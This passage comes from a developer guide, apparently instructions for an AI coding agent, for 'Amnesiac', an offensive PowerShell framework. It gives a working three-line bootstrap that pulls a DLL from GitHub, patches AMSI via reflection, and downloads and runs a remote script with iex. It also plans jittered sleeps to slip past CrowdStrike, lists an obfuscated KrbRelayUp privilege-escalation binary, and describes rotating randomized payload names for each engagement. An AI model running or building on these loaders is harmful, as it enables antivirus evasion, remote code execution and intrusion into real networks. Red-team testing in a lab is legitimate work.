| **`serve` diskmode conflict** | RESOLVED (Plan 5) | `serve` now roots `SimpleFileServer` at `$global:AmnesiacRoot` (project root), serving `Tools\` and `Amnesiac_ShellReady.ps1` directly — no GitHub download, no disk write. |
| **`Find-LocalAdminAccess` helper functions missing in Start-Job** | RESOLVED | `Get-ADComputers` and `FindDomainTrusts` are now captured in the parent process and passed as arguments; all three functions registered in the child process before `Find-LocalAdminAccess` runs. |
| **CS 3-minute HTTP delay in bootstrap** | TODO | CrowdStrike scrutinises HTTP connections from new processes within the first 3 minutes. The bootstrap 3-liner currently downloads immediately after process creation. Add a jittered pre-download sleep to the `bootstrap` command output as a recommended step: `Start-Sleep -Seconds (Get-Random -Min 180 -Max 300)` before line 1. Show it as an optional line in the bootstrap printout, not hardcoded — operator decides whether their delivery window allows the wait. |

---

## GitHub Repository & Releases Management

### Repository
- **Repo:** `https://github.com/0xSiarheiStar/Amnesiac`
- **Branch pushed to:** `master` AND `main` — `git push origin master master:main` (raw file URL uses `/main/`, so both must stay in sync)
- **Raw file base URL:** `https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/`
- **Releases tag:** `v1.0-al` — hosts binaries too large or inappropriate for the main repo

### Current GitHub Releases Assets (`v1.0-al`)

| Filename | What it is | Updated when |
|----------|-----------|--------------|
| `GNToN66tfw.dll` | AmnesiacLoader — current build (names randomized by `Build.ps1`) | Every `Build.ps1` run before a new engagement |
| `AuthHelper.exe` | KrbRelayUp obfuscated binary | Only when the KrbRelayUp source is recompiled/re-obfuscated |

> **Note:** The DLL filename (`GNToN66tfw.dll`) and the class/method names inside it (`GNToN66tfw.XsADynQePJ`, `sNEAGV9Yaj`) change every time `Build.ps1` is run. After re-running, both the Releases asset and the bootstrap docs below must be updated.

### Bootstrap 3-Liner — Current Build (GitHub path)
These are the live values for the current DLL on GitHub Releases. Update this block whenever the DLL is rebuilt and re-uploaded:



```powershell
# Line 1 — load AmnesiacLoader from GitHub Releases (AMSI never scans raw bytes)
$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('https://github.com/0xSiarheiStar/Amnesiac/releases/download/v1.0-al/GNToN66tfw.dll'))
# Line 2 — patch AMSI via reflection
$_a.GetType('GNToN66tfw.XsADynQePJ').GetMethod('sNEAGV9Yaj').Invoke($null,$null)
# Line 3 — load Amnesiac (AMSI now blind)
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Amnesiac_ShellReady.ps1');Amnesiac
```

> **Tip:** The `bootstrap` command inside a running Amnesiac session always generates the correct live 3-liner from the embedded name map — use that for copy-paste. The block above is reference only and can go stale if Build.ps1 is re-run without updating it here.

### Uploading to GitHub Releases (no `gh` CLI — use PowerShell + token)

`gh` CLI is not available in this environment. Use `Invoke-RestMethod` directly against the GitHub API. When the user provides a GitHub token, run the following:

**Step 1 — get release ID:**
```powershell
$token = '<ghp_...token...>'
$hdrs = @{ Authorization = "token $token"; Accept = "application/vnd.github+json" }
$rel  = Invoke-RestMethod "https://api.github.com/repos/0xSiarheiStar/Amnesiac/releases/tags/v1.0-al" -Headers $hdrs
$rid  = $rel.id
```

**Step 2 — delete the old asset (by name):**
```powershell
$assets = Invoke-RestMethod "https://api.github.com/repos/0xSiarheiStar/Amnesiac/releases/$rid/assets" -Headers $hdrs
$old = $assets | Where-Object { $_.name -eq 'OldName.dll' }
if ($old) { Invoke-RestMethod -Method Delete "https://api.github.com/repos/0xSiarheiStar/Amnesiac/releases/assets/$($old.id)" -Headers $hdrs }
```

**Step 3 — upload new asset:**
```powershell
$bytes   = [System.IO.File]::ReadAllBytes("AmnesiacLoader\bin\NewName.dll")
$upHdrs  = @{ Authorization = "token $token"; "Content-Type" = "application/octet-stream" }
Invoke-RestMethod -Method Post "https://uploads.github.com/repos/0xSiarheiStar/Amnesiac/releases/$rid/assets?name=NewName.dll" -Headers $upHdrs -Body $bytes
```

### What to Update After Re-running `Build.ps1`

When `Build.ps1` generates new randomized names, update **all** of these in order:

1. **Upload new DLL** to GitHub Releases `v1.0-al` using the PowerShell steps above (delete old, upload new)
2. **Update this doc** — replace the bootstrap 3-liner block above with the new DLL filename, namespace, class name, and method name (read them from the `# !!AL-MAP-BEGIN!!` block in `Amnesiac.ps1`)
3. **Update CLAUDE.md Scenario 2 bootstrap block** (near top of file) — same 3-liner appears there too; replace both occurrences
4. **Push `Amnesiac.ps1` and `Amnesiac_ShellReady.ps1`** to `master` — `Build.ps1` already embeds the new blob and name map into both files

### What to Update When Replacing `AuthHelper.exe` (KrbRelayUp)

If the KrbRelayUp binary is rebuilt/re-obfuscated under a different filename:

1. Upload new `.exe` to GitHub Releases `v1.0-al` (same Steps 1–3 above, `.exe` instead of `.dll`)
2. Update `$global:KrbRelayUpBin = 'NewName.exe'` in `Initialize-ToolCache` in both `Amnesiac.ps1` and `Amnesiac_ShellReady.ps1`
3. Update the `ToolSources` entry — it is auto-constructed from `$global:KrbRelayUpBin` so only the variable needs changing
4. Update the filename in this doc's Releases Assets table above

---

## Contribution Notes

- All changes target `Amnesiac.ps1` only unless adding new source files
- Test each layer independently before combining
- Run against GOAD lab with CrowdStrike enabled to validate evasion
- Document every change in `CHANGELOG.md` with the operational context for the change
- The `stealth` payload is built at generation time (when the operator selects it from `Show-PayloadMenu`) — it embeds the current session's `$global:EndMarker` and `$global:BufferSize`. If the protocol changes mid-session, re-invoke the listener to regenerate the stealth payload
